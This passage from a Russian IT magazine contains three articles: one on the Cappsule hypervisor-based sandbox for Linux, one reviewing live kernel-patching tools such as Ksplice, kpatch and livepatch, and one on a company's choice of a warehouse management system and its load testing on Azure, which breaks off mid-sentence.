ВИРТУАЛКА БЕЗ ЭМУЛЯЦИИ
Несмотря на то что Cappsule использует в своей работе механизмы виртуали-
зации Intel VT-x и EPT, назвать ее полноценной виртуальной машиной крайне
сложно. Это система изоляции, построенная на технологиях виртуализации.
Она использует простой и компактный гипервизор (всего 15 тысяч строк кода),
позволяющий запустить копию ядра Linux основной ОС и выбранное приложе-
ние внутри виртуального окружения с полной интеграцией приложения в теку-
щий графический интерфейс.
   Cappsule не эмулирует железо и не оперирует полноценными виртуальны-
ми машинами с собственным ядром, виртуальными дисками, сетевой картой
и другими компонентами обычного ПК, как это делает VirtualBox или QEMU.
Она действует намного хитрее: сразу после своей загрузки загружает в ядро
текущей ОС модуль с гипервизором и отдает ему управление. Гипервизор
в свою очередь создает новое виртуальное окружение и размещает внутри
него текущую ОС. Этот метод называется Blue Pill (он был описан Йоанной
Рутковской в 2006 году) и нужен для того, чтобы получить контроль над испол-
нением текущей ОС.





                                         Как Blue Pill перехватывает управление

После этого гипервизор Cappsule останавливает исполнение ядра ОС, пере-
водит в офлайн все ядра процессора, кроме текущего, делает снимок памяти,
занимаемой ядром ОС, затем возвращает ядру управление. Позднее, получив
запрос на запуск приложения в песочнице, гипервизор создает еще одно вир-
туальное окружение с копией памяти ядра, запускает в нем несколько служеб-
ных процессов и указанное приложение.
   Для приложения такая виртуальная система выглядит настоящей. Оно мо-
жет работать с файловой системой, выполнять сетевые запросы, выводить
на экран картинку и выполнять системные вызовы ядра. Но так как Cappsule
не эмулирует железные компоненты классической виртуальной машины
и не предоставляет доступ к реальному железу (фактически запрещены любые
операции ввода-вывода), для того чтобы дать приложению возможность до-
ступа к файловой системе, сетевому адаптеру и GUI-подсистеме, Cappsule за-
пускает внутри виртуального окружения три специальных процесса:
•  Fsclient для проброса файловой системы (точнее, иерархии) основной
   системы внутрь виртуальной. Fsclient имеет клиент-серверную архитектуру
   и общается с демоном fsserver, запущенным в хост-системе. При доступе
    к тому или иному файлу fsclient отправляет запрос fsserver, а тот в ответ вы-
   дает результат запроса или ошибку доступа, если доступ к этому файлу за-
   прещен в настройках. Естественно, виртуальное окружение может выпол-
   нять запись файлов, поэтому, чтобы не скомпрометировать хост-систему,
    fsserver модифицирует файлы в режиме copy-on-write (для этого он исполь-
    зует технологию OverlayFS ядра Linux, ту же, на которой построена система
   слоев в Docker). Другими словами, все модификации файлов из виртуаль-
   ного окружения будут уникальны только для этого виртуального окружения;
   изменить файлы напрямую оно не может.
•  Netclient для проброса внутрь виртуального окружения сетевого интерфей-
    са. В этом случае используется схожая схема: netclient создает внутри вир-
   туального окружения сетевой интерфейс tun0, все операции чтения и запи-
   си в который отправляются демону netserver, работающему в хост-системе.
  С помощью настроек брандмауэра netserver перенаправляет эти данные
   на реальный физический сетевой интерфейс машины, опять же консульти-
   руясь с настройками.
•  Guiclient для доступа приложения к графической подсистеме хоста. Прин-
   цип работы примерно тот же. Guiclient запускает внутри окружения вир-
   туальный X-сервер, запросы к которому перенаправляются в guiserver
   на хост-системе, а тот, в свою очередь, перенаправляет эти запросы на-
   стоящему X-серверу. Guiclient создан на базе графической подсистемы
   операционной системы Qubes OS и так же, как последняя, позволяет бес-
   шовно вписать окно запущенного внутри песочницы приложения в графи-
   ческий интерфейс хост-системы. Демонстрация работы Cappsule.

Благодаря такой архитектуре Cappsule реализует очень простые и устойчивые
к взлому песочницы. По факту для взломщика (или малвари), оказавшегося
внутри такой песочницы, есть только четыре возможности из нее выбраться:
через уязвимость гипервизора или уязвимость в одном из трех компонен-
тов — fsserver, netserver и guiserver. Причем последние три работают с права-
ми создавшего песочницу пользователя.

ГДЕ ВЗЯТЬ?
Исходный код Cappsule открыт, поэтому скачать и скомпилировать ее может
любой желающий. Однако есть довольно серьезные ограничения. Первое: си-
стема требует процессор с поддержкой Intel VT-x и EPT, так что древние про-
цессоры и AMD не подойдут. Второе: официально поддерживается единствен-
ный дистрибутив — Ubuntu 16.04 с ядром 4.4.0. Но протестировать систему
можно и в виртуалке. Для этого разработчики подготовили образы VMware
и VirtualBox.
   Вся документация доступна в отдельном Git-репозитории. Из нее мож-
но узнать, как установить Cappsule и пользоваться ею, создавать файлы по-
литик для ограничения приложений в доступе к файлам или сетевому взаимо-
действию. В целом все довольно просто. В случае с Ubuntu 16.04 достаточно
установить пакет:

$ wget https://irma.quarkslab.com/cappsule/cappsule-1.0.deb
$ sudo dpkg --force-confnew -i cappsule-1.0.deb
$ export PATH=$PATH:/usr/local/cappsule/usr/bin

Затем запустить демон:

$ sudo /usr/local/cappsule/usr/bin/daemon

И можно работать с приложениями в песочницах:

$ virt exec --no-gui --policy unrestricted bash

На экране должно появиться приглашение интерпретатора bash, запущен-
ного в песочнице. Опция --policy unrestricted здесь означает, что будут
использованы политики unrestricted, разрешающие доступ к любым файлам
и любым сетевым хостам по протоколам UDP и TCP. Сами политики размеща-
ются в JSON-файлах в каталоге /usr/local/cappsule/etc/cappsule/policies/. Кро-
ме unrestricted, в нем можно найти политики для Firefox, Irssi, Evince и Apache.
Причем, если имя приложения совпадает с именем файла политик, они будут
загружены автоматически:

$ virt exec firefox

Графические приложения запускаются в своих собственных окнах, но под-
держка копирования и вставки, а также вывода и записи аудио пока не реали-
зованы.





                                                     Политики доступа Firefox

ВЫВОДЫ
Cappsule еще слишком молодой проект, чтобы говорить о его будущем.
Но одно ясно точно: это самая интересная и в теории надежная реализация
песочниц для Linux из всех существующих на данный момент. Cappsule пред-
ставляет намного более узкий attack surface в сравнении с песочницами уров-
ня ОС или полноценными виртуальными машинами.
  Из песочницы Cappsule невозможно сбежать, взломав ядро или найдя
баг в реализации виртуальных устройств, как это уже было в случае с багами
в драйвере флоппи-привода и OpenGL-драйвере VirtualBox. Система крайне
проста и эффективна, она требует лишь свежее ядро Linux и поддержку техно-
логий виртуализации в процессоре.
UNIXOID
БЕЗБОЛЕЗНЕННАЯ
ИНЪЕКЦИЯ
ПАТЧИМ ЯДРО LINUX
БЕЗ ПЕРЕЗАГРУЗКИ





       Мартин
      «urban.prankster»
      Пранкевич
   prank.urban@gmail.com





Одна из удобных особенностей *nix-систем — компью-
тер не нужно перезагружать после установки, удаления
и обновления программ. Именно поэтому серверы в сети
могут спокойно работать годами, хотя ПO постоянно об-
новляется администраторами. Единственное исключение
из правила представляет обновление ядра ОС: здесь уже
без перезагрузки точно не обойтись. Хотя в Linux это уже
тоже не обязательно.

ПРОЕКТЫ
В самой перезагрузке в общем ничего плохого нет. Если это домашний ПК или
отдельный VDS, то минута-другая в ночное время вряд ли будет проблемой
для пользователей. К тому же некоторые дистрибутивы из коробки поддержи-
вают механизм kexec (появился в Linux с версии 2.6.27), позволяющий загру-
зить новое ядро из текущего окружения без физической перезагрузки серве-
ра, что обеспечивает минимальный простой.
   Другое дело, что во время повальной виртуализации на физическом сер-
вере могут работать десятки виртуальных машин — в этом случае перезагруз-
ка очень даже проблематична. А еще есть системы реального времени, раз-
личные симуляторы, работающие месяцами, и многое другое. Обновление
ядра Linux на лету для таких систем, критичных ко времени простоя, сегод-
ня очень востребовано, и поэтому неудивительно, что в разное время стар-
товало несколько проектов, относящихся к классу dynamic software updating:
Ksplice от Oracle, KernelCare от CloudLinux, kGraft от SUSE, kpatch от Red Hat
и livepatch. Все они похожи по общему принципу работы, но отличаются в де-
талях реализации.

KSPLICE
Самый старый проект. Начат приблизительно в 2006 году как магистерская
диссертация в MIT (pdf) одного из пяти разработчиков Джеффа Арнольда
(Jeff Arnold). Идея создать технологию, позволяющую безопасно обновлять
ОС без перезагрузки, возникла после неудачного обновления серверов MIT,
когда процедура готовилась неделю, но в итоге из-за ошибки оказалась про-
блемной. Проведенный разработчиками анализ патчей безопасности за пе-
риод с 2005 по 2008 год показал, что в 87% случаев патч только добавлял про-
верку некоторых параметров, а поэтому такие исправления можно применять
без остановки работы. Это и послужило толчком к старту проекта.
   Изначально поддерживалась только x86/x64 Linux, но, по заявлениям раз-
работчиков, код написан таким образом, что его очень легко можно перенести
на Mac и Win (хотя этого до сих пор никто не сделал). В 2009 году проект при-
влек внимание инвесторов, получив премию в 100 тысяч долларов. В это же
время разработчики организовали компанию Ksplice, Inc.
   Ksplice первоначально был ограничен патчами, не использовавшими се-
мантические изменения в структурах данных, что присуще многим (но не всем)
патчам безопасности. Сегодня возможно применить Ksplice и при измене-
нии семантики, но в автоматическом режиме генерировать такие патчи не-
возможно, поскольку это потребует дать Ksplice дополнительные инструкции.
А вот четких указаний, как составить такие инструкции, у разработчиков нет, да
и для этого требуются специфические знания, поэтому вряд ли сисадмин или
пользователь будет этим заниматься. Кроме того, сборку патча нужно произ-
водить ровно в таком же окружении, как у используемого ядра. Разные версии
GCC генерируют разный код, предсказать, как будет выглядеть бинарный патч
в таком случае, невозможно. Именно поэтому разработчики основой техноло-
гии считали специальный сервис обновления Ksplice Uptrack, упрощавший все
операции, так как все необходимые патчи готовились и проверялись на рабо-
тоспособность специальной командой.
  Первым дистрибутивом, официально поддерживающим технологию, стал
Ubuntu, пользователи которого при помощи Ksplice Uptrack могли устанавли-
вать критические обновления ядра в дистрибутиве Ubuntu 9.04 без переза-
грузки и остановки работы системы. Позже к ним присоединилась и Fedora
Linux, коммерческую поддержку Ksplice получили RHEL, CentOS, CloudLinux,
Ubuntu Server и Debian GNU/Linux.
  В 2011 году Ksplice, Inc. была выкуплена Oracle, и теперь это основной ком-
понент всех Oracle Linux. Компания сразу закрыла доступ к разработке. Се-
годня можно скачать и свободно использовать для своих сборок лишь старую
версию 0.9.9.1. Поддержка для RHEL была прекращена, но остался доступным
30-дневный пробный период. С 2015 года бесплатная поддержка доступна
для Ubuntu Desktop (а настоящее время 12.04, 14.04, 16.04, 16.10) и Fedora 23
и 24. Чтобы начать работать, достаточно установить пакет с сайта разработ-
чика. Метод получения обновлений не изменялся — они по-прежнему загру-
жаются из стандартных репозиториев Ubuntu, а затем транслируются в пред-
ставление, подходящее для использования в Ksplice.
   Ksplice универсален, так как не требует специальной модификации ядра
и теоретически может работать с любым. Необходимо лишь установить пакет,
содержащий модуль ядра и пользовательские утилиты, а также оформить файл
изменений, который будет спроецирован на работающее ядро. Обновление
ядра производится в два этапа. На первом шаге специальная утилита ksplice-
create собирает ядро, используя исходные тексты и патч к ядру, и сравнива-
ет получившийся образ со старым ядром. В результате генерируется модуль
ядра, содержащий код измененных функций.





                                                        Ksplice доступен для подписчиков





                           Установка обновлений при помощи Ksplice Uptrack в Ubuntu

На втором этапе модуль ядра ksplice.ko получает бинарный патч и после ана-
лиза необходимых изменений меняет адреса текущих функций ядра на адреса
новых функций, указанных в патче, передавая им управление, плюс изменяют-
ся данные и структуры в памяти. Для этого на какой-то миг замораживается
выполнение всех программ и проверяется, что текущие процессы не исполь-
зуют функции, требующие изменения. Затем выполнение процессов возоб-
новляется. Время заморозки системы зависит от количества изменений, хотя
оно все равно измеряется миллисекундами и точно гораздо меньше, чем пе-
резагрузка системы, и главное, что фактически работа сервера и программ
не прерывается.
   Откат, при необходимости, делается в таком же порядке (утилитой ksplice-
undo). Если модуль содержит патч для не загруженного в данный момент объ-
екта, он не делает ничего, информация обновится, как только он будет за-
пущен. Некоторые основные системные функции, постоянно используемые
ядром, обновить при помощи Ksplice не получится.
   Ksplice изначально позволял применять исправления только к ядру Linux,
но новые возможности Ksplice, реализованные в Oracle Linux 7 и чуть позже
для 6, позволяют вносить изменения в разделяемые библиотеки без необхо-
димости перезапуска связанных с ними работающих процессов. Применение
исправлений также производится на лету и позволяет избавиться от необхо-
димости планового перезапуска длительно работающих приложений. На се-
годня user space возможность обновления реализована для glibc и OpenSSL.

KGRAFT, KPATCH, KERNELCARE
Самый большой недостаток Ksplice — это закрытость проекта. Привязанность
к конкретному дистрибутиву делает его неинтересным. Именно поэтому прак-
тически сразу, как стала ясна политика Oracle, основные игроки рынка нача-
ли свои разработки, которые в общем похожи на Ksplice и отличаются только
реализацией (процессом подготовки патчей и их применением). Поэтому бук-
вально пару слов о каждом.
   kGraft изначально позиционируется как open source проект. Прототип был
представлен общественности компанией SUSE в январе 2014-го и выпущен
в марте 2014 года. Компоненты, работающие на уровне ядра, открыты под ли-
цензией GPLv2, а утилиты, позволяющие создавать патчи к ядру, — под GPLv3.
Чуть позже для SLES 12 стала доступна новая функция Live Patching. В апреле
2014 года проект был предложен для добавления в основную ветку ядра Linux
и после небольших доработок включен в ядро Linux 4.0, выпущенное в апре-
ле 2015 года. Но реализация механизмов согласования на уровне функций,
необходимых для безопасных переходов между исходными и исправленны-
ми версиями функций, была отложена, поскольку остались нерешенными не-
сколько моментов. Для проверки объектных файлов во время компиляции
ядра и обеспечения сохранности стека вызовов разработана дополнительная
утилита stacktool.
  В своей работе kGraft базируется на уже доступных в ядре технологиях:
трассировщике ftrace (Function Tracer), используемом для подмены функций,
работе с памятью через mcount, технике патчинга INT3/IPI-NMI, RCU (read-
copy update) модели обновления кода, не требующей остановки ядра. Патч
формируется непосредственно на основе анализа исходных текстов, без ма-
нипуляций с объектным кодом. Сгенерированный модуль загружается в ядро
штатными средствами, как и любой другой модуль ядра, после чего вносит из-
менения в ядро без прерывания работы системы.
   Основное отличие от Ksplice в том, что kGraft не останавливает процессы.
Вместо этого он заменяет старые функции новыми постепенно, дожидаясь
прерывания при выходе из kernel space, поэтому в какой-то момент в системе
работают обе версии функций. Чтобы не допустить возможных рассогласова-
ний при работе обеих версий со структурами данных, используются дополни-
тельные проверки.





                                  Список патчей SUSE Linux Enterprise Live Patching

Red Hat анонсировала свой kpatch буквально через месяц после появления
информации о kGraft. Он похож на Ksplice: при применении патча останавли-
ваются все процессы и функции подменяются новыми. Такой подход разра-
ботчики Red Hat считают более безопасным и простым в реализации. Для под-
мены функции используется ftrace. Выпущен под GPLv2. Kpatch одновременно
с kGraft также предложен в ядро Linux, в общем с теми же результатами.
   Технология входит в состав RHEL 7 и лежит в основе ReadyKernel, дистри-
бутива Virtuozzo Linux 7 (ранее в Virtuozzo использовали KernelCare, о котором
ниже). Последний патч, например, устраняет проблему безопасности с высо-
ким приоритетом CVE-2016-5195 MAP_PRIVATE COW, позволяющую локаль-
ному пользователю повысить свои привилегии. Это, кстати, как раз тот случай,
когда патч действительно необходим и систему бы пришлось перезагружать.





                            Патч ReadyKernel, устраняющий проблему CVE-2016-5195

Следующей за kGraft и kpatch анонсировала свой сервис KernelCare, позво-
ляющий обновлять ядро без перезагрузки, компания CloudLinux. Бета-версия
появилась в марте 2014 года, а коммерческое использование началось уже
с мая. Модуль ядра выпускается под GPLv2, остальные компоненты доступны
только по лицензии в двоичном формате. Патч содержит дополнительную ин-
формацию обо всех изменениях и о том, как их применять, позволяет модифи-
цировать уязвимые функции и структуры данных.
   Агент KernelCare, установленный на сервере, проверяет наличие новых
патчей в репозитории, загружает их, после чего модуль ядра их применя-
ет. Принцип схож с Ksplice, то есть при переключении на новые функции про-
цессы приостанавливаются. Патчи KernelCare предоставляются по подписке
для CentOS/RHEL 5–7, CloudLinux 5–7, Ubuntu 14.04/16.04, Debian 6, 7 и си-
стемы виртуализации OpenVZ, KVM, Virtuozzo и других.

...И KGRAFT + KPATCH
Две практически одинаковые реализации одной проблемы в ядре — это мно-
говато. Поэтому, столкнувшись с рядом проблем, разработчики kpatch и kGraft
решили объединить свои усилия в новом универсальном проекте, названном
livepatch, особенность которого — возможность использования патчей обоих
типов. Разработки kpatch и kGraft фактически забросили, в Git ядра Linux по-
следние изменения зафиксированы полгода назад. Сам livepatch при этом
предоставляет лишь базовый интерфейс для регистрации и активации патчей
в ядре и реализован в форме управляющего модуля livepatch.ko.
  По аналогии с другими проектами в livepatch есть замены функций в ядре
целиком и перенаправления на новую функцию при помощи штатной подси-
стемы ftrace. Патч оформляется в виде модуля ядра, который выполняет необ-
ходимую подстановку кода функций. Из областей, которые еще требуют дора-
ботки, отмечается обеспечение целостности системы при применении патча.
Для работы livepatch потребуется ядро версии 4.4 и выше (поэтому старые
дистрибутивы не поддерживаются).
  В октябре этого года технология livepatches стала официально доступной
пользователям Ubuntu 16.04, обеспечивая установку патчей Ubuntu Security
Notices (USN) и CVE. Пока только для x86_64, но в будущем планируется вне-
дрить поддержку POWER8, s390x и ARM64. x86-системы непопулярны на серве-
рах и не получат такой возможности, как и релизы без долгосрочной поддержки
тоже не смогут работать с livepatch, поскольку они тестовые и не ориентирова-
ны на бесперебойно работающие системы. Обычные пользователи без плат-
ной подписки UA могут получать обновления только на три компьютера. Однако
стоит учесть, что патчи будут тестироваться в первую очередь как раз на тех,
кто получил обновления бесплатно, а пользователи с платной техподдержкой
получат обновления только после тщательного тестирования.
   Исходный код модулей livepatch доступен на git.launchpad.net, код клиента
canonical-livepatch — коммерческое ПО и часть продукта по управлению си-
стемами Landscape. Использование livepatch в Ubuntu выглядит очень про-
стым. Регистрируемся на ubuntu.com/livepatch и получаем токен.





              Для использования livepatch в Ubuntu необходимо зарегистрироваться


Устанавливаем snap-пакет:

$ sudo snap install canonical-livepatch

Включаем livepatch:

$ sudo canonical-livepatch enable 043eca......560b04da3

Это все. Теперь демон будет каждые четыре часа проверять наличие обновле-
ний и устанавливать. Статус можно посмотреть, введя

$ sudo canonical-livepatch status --verbose

Чтобы временно отключить canonical-livepatch, достаточно просто запретить
установку новых модулей:

$ echo 1 | sudo tee /proc/sys/kernel/modules_disabled





                                              Использование canonical-livepatch

ВЫВОД
Домашнему пользователю новая технология вряд ли будет интересна, ведь
перезагрузка компьютера для установки полноценного обновления — это
не проблема. А отсутствие инструментов не позволяет покопаться во внутрен-
ностях даже любопытным. А вот владельцу интернет-магазина, размещен-
ного на VDS, совсем игнорировать ее не стоит. Тем более что использовать
livepatch, как и все остальные решения обзора, очень просто.
SYNACK
ВЫБИРАЕМ
WMS-СИСТЕМУ И ЕЕ
ТЕХОБЕСПЕЧЕНИЕ





          WMI, SCALE ИЛИ WMOS?
Роман Стрюк     ЦОД ИЛИ ОБЛАКО?                Евгений Рулев





Наша компания является российским представительством глобальной группы
Yusen Logistics. Как это нередко бывает, достоинства глобальных компаний обо-
рачиваются их же недостатками, так как головные и региональные штаб-квар-
тиры стараются организовать централизованное управление всем, зачастую
без учета «поправок на местность». С этим, к сожалению, пришлось столкнуть-
ся и нам. С 2008 года YL-RU предоставляет услуги 3PL-оператора на россий-
ском рынке. В качестве WMS все это время использовалась система Warehouse
Management for IBMi (WMi) производства Manhattan Associates (далее МА).
   Серверы расположены в ЦОДах внутреннего ИТ-интегратора в Бельгии и Гол-
ландии. Вся инфраструктура и сама WMS обслуживалась и дорабатывалась бель-
гийской командой. Очевидно, что плюсом такого решения был относительно
быстрый запуск с относительно низкими затратами. Компании достаточно было
держать в штате двух эникейщиков, способных перевести запрос пользователя
на английский и переправить его соответствующей группе поддержки.
  Само собой, за такие удобства приходилось платить, и в нашем случае пла-
тить в евро. С сентября 2014 года это стало дорого, а с декабря — безумно
дорого. Компания начала резать косты, в первую очередь валютные. Любые
валютные ценники старались зафиксировать в рублях по приемлемому курсу.
   Сработало со всеми, кроме наших бельгийцев. После очень долгих угово-
ров, финансовых обоснований, сотен страниц презентаций с графиками, от-
ражающими негативный рост наших доходов и конкурентоспособности, RHQ
все же разрешили нам внедрить WMS локально в России и задействовать ло-
кальных (читай «дешевых») специалистов для ее поддержки и развития.

От редакции

Данная статья не является специальным рекламным проектом. Это просто
интересное описание чужого опыта :).


ВЫБОР НОВОЙ WMS
Нам дали свободу, но свободу на их условиях. Поскольку у группы заключен
глобальный контракт в Manhattan Associates, то и выбирать новую WMS можно
только из линейки MA, а это:
•  WMi;
•  SCALE;
• WMOS.

Первая и последняя отпали сразу: даже в «КОРУС Консалтинг», хоть он и ло-
кальный геопартнер MA в России (к сожалению, единственный), знали об этих
системах достаточно поверхностно и не смогли бы нам оказать качествен-
ную поддержку ни при внедрении, ни в дальнейшем использовании. К функ-
циональности самих систем претензий никаких быть не может, они растут
и успешно развиваются с девяностых годов и к нашему времени уже успели
стать громадными звездолетами среди систем управления складом. Соб-
ственно, стоимость внедрения и сопровождения сопоставима со стоимостью
какого-нибудь Millennium Falcon.
   Остался SCALE. С ним все наоборот. Система относительно молодая,
некоторых вещей в ней еще не хватает, но она работает под управлени-
ем Windows и полностью базируется на .NET, что дает много возможностей
для доработок и кастомизаций. На рынке есть достаточное количество специ-
алистов, хорошо знающих систему снаружи и изнутри, ну и тот самый «КОРУС»
съел далеко не одну собаку на внедрении SCALE абсолютно разношерстным
клиентам в разных конфигурациях.
   Тыл кажется прикрытым. Отлично! Давайте думать о техническом обеспе-
чении фронта!

ОЦЕНКА ТРЕБОВАНИЙ СИСТЕМЫ
А на фронте получается следующее:
1. Как и многие системы такого рода, SCALE состоит из трех основных эле-
   ментов:
   • сервер БД (MS SQL);
   • сервер приложения;
   • сервер клиентского доступа (рекомендуется использование RDS для ор-
     ганизации доступа клиентов).
2. Система относится к классу business-critical, и по внутренним требовани-
   ям группы мы должны обеспечить ее отказоустойчивость, высокую доступ-
   ность и сохранность данных. Опыт подсказывает, что с каждым пунктом тре-
   бований стоимость локальной инфраструктуры смело умножается на два,
   а то и на три...

Получается, что для удовлетворения всех требований нам придется построить
кластер как минимум на трех нодах, одной СХД (в идеале — двух) и паре опто-
волоконных коммутаторов.





    Общая схема решения. На схеме приведено только то оборудование, которое нуж-
    но было закупить, поскольку среда для резервного копирования есть и дополни-
    тельных инвестиций на данном этапе не требует


По нашему описанию нагрузки на систему и требованиям к отказоустойчивости
в MA любезно составили рекомендации к инфраструктуре (sizing). Точнее, три
сайзинга — каждый раз, пребывая, мягко говоря, в шоке от очередного рас-
чета стоимости железа и лицензий, мы пересматривали свой подход и к SLA,
и к количеству модулей самого SCALE, которые планировали приобрести.
  Самый простой вариант боевой части инфраструктуры по рекомендациям
MA представлен на рис. 1–3.





В итоге, после длительных обсуждений сойдясь на том, что часть модулей
не даст большого прироста в производительности склада и не окупится в бли-
жайшие пять лет, а сам склад в случае серьезного сбоя сможет продолжать
работу без WMS максимум три часа, мы нашли компромисс между «хочу»
и «могу» стоимостью в 50 тысяч долларов за оборудование и примерно 10 ты-
сяч долларов за лицензии (только Microsoft).


Чтобы определить стоимость оборудования, мы запрашивали цены у HP,
Lenovo и Fujitsu. Отдельная благодарность всем менеджерам за терпение
и предоставленные расчеты.


Еще один фактор, который учитывался при расчетах, — это стоимость разме-
щения оборудования в ЦОД уровня не ниже Tier  III (требование глобальных
политик группы). При ориентировочной стоимости в 30 долларов за unit в ме-
сяц на выходе получается сумма в 18 тысяч долларов (10 units на 60 месяцев).
Не стоит забывать о приобретении расширенной гарантии на оборудование
через три года, а это еще как минимум 5–6 тысяч. В общей сложности 84 тыся-
чи долларов, и это без учета зарплаты сисадминов, утилизации пространства
в резервном хранилище и при условии, что часть нашей инфраструктуры уже
размещена в ЦОД и там есть сетевое оборудование и резервируемое под-
ключение к интернету.
   Кусается... А так как логистика и без того не самая богатая отрасль, то очень
кусается.

А МОЖЕТ, AZURE?
Сразу  оговорюсь, широкого  практического опыта  использования  Azure
ни у меня, ни у моих ребят в отделе не было. Мы всего лишь поглядывали в эту
сторону, следили за обновлениями сервиса, почитывая по диагонали новост-
ные рассылки от Microsoft.
   Очевидные достоинства сервиса еще раз описывать бессмысленно, кос-
немся лишь части Pay as You Go. Именно она заставила нас серьезно рассма-
тривать сервис в качестве альтернативы собственной инфраструктуре.
   Рабочий график наших офисов составляет 12 часов в сутки, семь дней в не-
делю. Добавим по одному часу до и после рабочего дня, и получается, что мы
можем использовать Azure около 434 часов в месяц (14 часов * 31 день) вме-
сто 744 и платить только за них. Очень грубая прикидка показывает 40% эко-
номии в месяц. За собственное железо так платить не получится — это факт.
Заманчиво, но нечистый, как известно, кроется в деталях.
   Наибольшие сомнения вызывали два момента:
1. Согласно рекомендациям MA дисковая подсистема сервера БД должна
   обеспечивать около 1000 операций ввода/вывода в секунду.
2. Azure — это все же Shared Virtual Environment, и наш сервер БД рискует ока-
   заться виртуальным соседом еще одного или, что хуже, нескольких требо-
   вательных серверов, используемых другими клиентами Microsoft.

TOO COOL TO BE TRUE!
Итак, запрос отправлен менеджеру в MS, ждем. Первая телеконференция
была организована достаточно скоро и длилась примерно два с половиной
часа. Ребята были уверены, что производительность Azure обеспечит наши
потребности, а я (сейчас уже можно признаться) очень долго относился к ре-
шению с нездоровой долей скептицизма и пытался найти недостатки в Azure,
которые помогли бы мне сделать выбор не в их пользу. Серьезно! Это сложно
объяснить, но все время не покидало ощущение, что «слишком хорошо, чтобы
быть правдой». Простите,господа,такужвоспиталажизнь.
  По итогам конференций и переписок решено было протестировать три
конфигурации среды:
1. Эконом-вариант:
   • 1xA0 Basic (DC, Print Server)
   • 2xA3 Basic (SQL Server / Application Server + RDS / Client Access Server)
2. Performance:
   • 1xA0 Basic (DC, Print Server)
   • 1xA3 Basic (RDS / Client Access Server)
   • 1xD3_v2 (SQL Server / Application Server)
3. Performance+:
   • 1xA0 Basic (DC, Print Server)
   • 1xA3 Basic (RDS / Client Access Server)
   • 1xDS3_v3 + 2xP20 (SQL Server / Application Server)

Забегая вперед, скажу, что до тестирования третьей конфигурации дело не до-
шло. Причина чуть ниже. Но теоретически производительности дисков хватило
бы с лихвой:
•  два диска по 2300 IOPS в RAID 1 (пожертвуем рекомендованным RAID 1+0)
   при распределении R/W 50% на 50% дадут около 3450 IOPS;
• RAW IOPS = 2300 * 2 = 4600;
•  Functional IOPS = (4600 * 0,5)/2 + 4600 * 0,5 = 3450.
   IOPS — что это такое и как его считать.

НАГРУЗОЧНОЕ ТЕСТИРОВАНИЕ
Можно было остановиться и на теоретических расчетах, подкрепленных результа-
тами тестов, полученными с помощью IOmeter, но, поскольку триальная подписка
в Azure еще жива, а сомнения все еще терзают, решено было провести нагрузоч-
ное тестирование — эмулировать самый нагруженный день в работе склада.
   Долго и мучительно искать ПО для этих целей не пришлось. В одной из бе-
сед наш менеджер в MA обмолвился, что для нагрузочного тестирования они
используют HP LoadRunner и еще какой-то сугубо внутренний продукт, кото-
рый не предназначен для распространения. К слову, HP LR доступен и в Azure,
но нам удобнее было установить его на несколько машин на земле, чтобы рас-
параллелить задачи и сократить время на запись и оттачивание скриптов и по-
том перенести их в облако непосредственно перед тестированием.
  Во время тестирования предполагалось пошагово эмулировать весь цикл
жизни товара на складе, от его поступления и до отгрузки конечному заказчику:
•  поступление товара (выгрузка из машины);
•  размещение в стеллажи;
•  подбор товара в заказы;
•  отгрузка и закрытие заказа.

Все эти шаги выполняются с использованием мобильного терминала сбора
данных, у нас это Motorola MC9000 и MC9100 под управлением Windows CE
5.0 и 6.0.

ВИРТУАЛЬНЫЕ ПОЛЬЗОВАТЕЛИ
— «Да не дерзнет никто создавать машину по образу и по-
добию человеческого разума», — процитировал Поль.
— Правильно. (...) Но на самом деле в Оранжевой Книге
должно быть сказано: «Да не дерзнет никто создавать ма-
шину, ПОДМЕНЯЮЩУЮ человеческий разум».

Фрэнк Герберт. Дюна

Мы решили создать виртуальных пользователей (ботов), которые бы имити-
ровали действия живых людей через веб-оболочку SCALE, где и будут рабо-
тать конечные пользователи. В пакете HP LoadRunner есть утилита Virtual User
Generator (VUGEN), предназначенная для записи пользовательских скриптов
и генерации виртуальных пользователей, которых потом можно использовать
в необходимых количествах для нагрузочного теста. В VUGEN поддерживает-
ся масса протоколов, которые можно использовать как по отдельности, так
и вместе (например, Citrix ICA, FTP, LDAP, ODBC, SAP GUI и множество дру-
гих), но нас в первую очередь интересовал протокол Web HTTP/HTML, позво-
ляющий записывать действия пользователя в браузере Internet Explorer.
   Особой сложности в записи самих ботов в нашем случае не было — мы
последовательно записали все пользовательские действия по приемке и от-
грузке товара, его перемещению на складе и так далее. Поскольку предпола-
галось запускать одновременно до сорока ботов, то при каждом сеансе запи-
си очередных пользователей мы не забывали закрывать все старые вкладки
в браузере (чтобы избежать генерации кусков кода, не имеющих отношения
к задаче) и разлогиниваться из веб-системы SCALE (это важный момент, по-
тому что в дальнейшем каждый новый бот должен был заново авторизоваться
в системе под уникальным логином, так что соответствующий код надо было
иметь). В результате система генерировала код (язык, кстати, можно выби-
рать; мы выбрали С, и это, возможно, было не самым правильным решением,
потому что в нем очень тяжело работать со строковыми переменными), кото-
рый выглядит примерно так:





                                                          Интерфейс VUGEN

Получается некая болванка, которую надо тщательно допиливать, чтобы она за-
работала правильно. Что важно помнить: если работа с кодом ботов ведется
в рамках одного проекта в VUGEN (он там называется Solution), то для каждого
бота надо создавать отдельный новый скрипт (они добавляются там примерно
как вкладки в браузере, вкладки можно переименовывать, если нужно).
   Поскольку код довольно тяжеловесный (суммарное количество строк кода
для сорока ботов получилось почти 80 000 — да, восемьдесят тысяч), то неко-
торые моменты не получается заметить сразу. Например, первое время боты
выполняли только первый шаг итерации; при разборе полетов выяснилось,
что в веб-приложении SCALE используется сквозная последовательная нуме-
рация пользовательских форм. А это значит, что даже при возврате в основ-
ное меню форма ReceivingRF.aspx_3 получает имя ReceivingRF.aspx_13
(для примера взята форма из бота, который занимался приемкой товара,
он выполняет это действие в десять шагов) и так далее, то есть нельзя просто
копировать нужные участки кода, надо следить за корректной нумерацией. За-
дания для ботов были подготовлены заранее в самой среде SCALE, а каждому
боту выдан свой собственный участок работы, что было жестко зашито в коде.
   Как инструмент VUGEN довольно гибок: например, понравилась возмож-
ность в один клик превращать часть параметров из статичных в переменные
(скажем, идентификатор сессии бота), есть цветовое выделение синтаксиса
кода, удобные инструменты для работы с текстом, которые работают не только
с текущим кодом, но и со всем проектом сразу. После первичной фазы тести-
рования «на земле», когда работа ботов была отлажена (на это ушла почти не-
деля), был сгенерирован поведенческий сценарий (для этого предназначена
утилита HP Controller), с указанием количества ботов и задержкой их запуска
(чтобы не все скопом пытались лезть на сервер). Он был протестирован и от-
